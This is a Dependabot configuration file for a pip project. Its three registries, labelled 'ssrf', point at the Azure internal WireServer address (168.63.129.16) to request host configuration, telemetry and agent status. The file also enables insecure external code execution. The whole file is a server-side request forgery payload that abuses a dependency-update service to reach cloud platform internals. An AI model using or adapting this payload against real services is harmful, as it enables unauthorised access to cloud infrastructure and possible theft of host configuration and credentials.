version: 2
registries:
  ssrf-a:
    type: python-index
    url: http://168.63.129.16/?comp=config#
    token: ${{ secrets.SSRF_TOKEN }}
  ssrf-b:
    type: python-index
    url: http://168.63.129.16/?comp=telemetrydata#
    token: ${{ secrets.SSRF_TOKEN }}
  ssrf-c:
    type: python-index
    url: http://168.63.129.16/?comp=agentStatus#
    token: ${{ secrets.SSRF_TOKEN }}
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"
    insecure-external-code-execution: allow
    registries:
      - ssrf-a
      - ssrf-b
      - ssrf-c
